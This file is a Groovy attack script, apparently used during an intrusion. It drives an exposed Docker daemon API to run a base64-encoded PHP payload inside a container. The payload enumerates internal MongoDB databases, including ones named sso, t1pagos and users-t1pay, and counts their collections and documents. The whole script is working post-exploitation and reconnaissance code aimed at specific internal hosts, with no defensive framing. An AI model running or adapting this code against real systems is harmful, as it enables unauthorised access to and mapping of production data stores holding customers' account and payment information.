import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
// Try connecting to PRIMARY 27021 with readPreference=secondary
$m=new MongoDB\\Driver\\Manager("mongodb://172.26.84.132:27020,172.26.84.132:27021/?readPreference=secondaryPreferred&slaveOk=true");

$dbs = ["credito-claroshop","singlepages","sso","t1pagos","users-t1pay","tienda","t1_envios","t1fullfilment","tracking","reviews","shipping_ms","marketing","carga_productos_sears"];

echo "db|collections|total_docs\n";
foreach($dbs as $db){
    try {
        $cmd=new MongoDB\\Driver\\Command(["listCollections"=>1]);
        $r=$m->executeCommand($db,$cmd);
        $r->setTypeMap(["root"=>"array","array"=>"array","document"=>"array"]);
        $arr=iterator_to_array($r);
        $cols=$arr[0]['cursor']['firstBatch'];
        $ncol=count($cols);
        $totalDocs=0;
        $colList=[];
        foreach($cols as $col){
            $cname=$col['name'];
            try {
                $cmd2=new MongoDB\\Driver\\Command(["count"=>$cname,"readPreference"=>["mode"=>"secondaryPreferred"]]);
                $r2=$m->executeCommand($db,$cmd2);
                $r2->setTypeMap(["root"=>"array","array"=>"array","document"=>"array"]);
                $arr2=iterator_to_array($r2);
                $n=$arr2[0]['n'];
                $totalDocs+=$n;
                $colList[]="$cname:$n";
            } catch(Exception $e) {
                $colList[]="$cname:ERR(".$e->getMessage().")";
            }
        }
        echo "$db|$ncol|$totalDocs\n";
        if($ncol>0) echo "  cols: ".implode(", ",array_slice($colList,0,40))."\n";
    } catch(Exception $e) {
        echo "$db|ERR|0\n";
    }
}
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(120000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/mc2.php && php /tmp/mc2.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(180000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
